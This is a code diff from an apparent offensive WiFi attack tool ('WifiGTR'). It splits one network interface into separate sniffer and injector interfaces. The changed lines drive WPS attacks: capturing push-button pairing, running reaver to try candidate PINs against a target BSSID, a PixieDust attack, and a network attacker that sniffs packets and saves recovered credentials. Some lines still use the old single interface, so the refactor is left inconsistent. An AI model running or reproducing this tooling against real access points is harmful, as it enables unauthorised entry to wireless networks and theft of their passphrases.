@@ -247,7 +247,7 @@ class WifiGTR:
             # Push-Button PBC Capture
             try:
                 from wifi_nightmare.wps_suite import WPSPbcSniffer
-                sniffer = WPSPbcSniffer(self.interface, bssid, channel, ssid)
+                sniffer = WPSPbcSniffer(self.sniffer_interface, bssid, channel, ssid)
                 res = sniffer.listen_for_pbc(timeout=120)
                 if res and res.success:
                     self.db.save(bssid, ssid)
@@ -268,11 +268,11 @@ class WifiGTR:
                 if shutil.which("reaver"):
                     try_test = input(f"\n{C_YELLOW}[?] Automatically test these PINs against target with reaver? (y/n) [y]: {C_RESET}").strip().lower()
                     if try_test != 'n':
-                        utils.run_command(["ip", "link", "set", self.interface, "up"])
-                        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+                        utils.run_command(["ip", "link", "set", self.sniffer_interface, "up"])
+                        utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
                         for pin in pins:
                             print(f"\n{C_YELLOW}[*] Testing PIN: {pin} on {utils.mask_bssid(bssid)} (Channel {channel})...{C_RESET}")
-                            cmd = ["reaver", "-i", self.interface, "-b", bssid, "-c", str(channel), "-p", pin, "-vv", "-N", "-T", "1"]
+                            cmd = ["reaver", "-i", self.injector_interface, "-b", bssid, "-c", str(channel), "-p", pin, "-vv", "-N", "-T", "1"]
                             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                             success = False
                             psk = ""
@@ -313,7 +313,7 @@ class WifiGTR:
             timeout = 120
 
         attacker = PixieDustAttack(
-            interface=self.interface,
+            interface=self.injector_interface,
             target_bssid=bssid,
             target_channel=channel,
             target_ssid=ssid,
@@ -739,9 +739,9 @@ class WifiGTR:
                 last_print = 0
                 while not self.scanner.stop_sniffing and not sig.stopped:
                     try:
-                        sniff(iface=self.interface, prn=self.scanner.packet_handler, count=0, timeout=0.1, store=0)
+                        sniff(iface=self.sniffer_interface, prn=self.scanner.packet_handler, count=0, timeout=0.1, store=0)
                     except OSError:
-                        utils.run_command(["ip", "link", "set", self.interface, "up"])
+                        utils.run_command(["ip", "link", "set", self.sniffer_interface, "up"])
                         continue
 
                     if time.time() - last_print > 0.5:
@@ -820,7 +820,7 @@ class WifiGTR:
             utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
             
             attacker = NetworkAttacker(
-                interface=self.interface,
+                interface=self.injector_interface,
                 target_bssid=bssid,
                 target_channel=channel,
                 db_handler=self.db,
@@ -835,7 +835,7 @@ class WifiGTR:
                     if time.time() - start_time > duration:
                         break 
                     try:
-                        sniff(iface=self.interface, prn=attacker.sniffer_callback, count=0, timeout=0.5, store=0)
+                        sniff(iface=self.sniffer_interface, prn=attacker.sniffer_callback, count=0, timeout=0.5, store=0)
                     except OSError:
                         utils.run_command(["ip", "link", "set", self.interface, "up"])
 
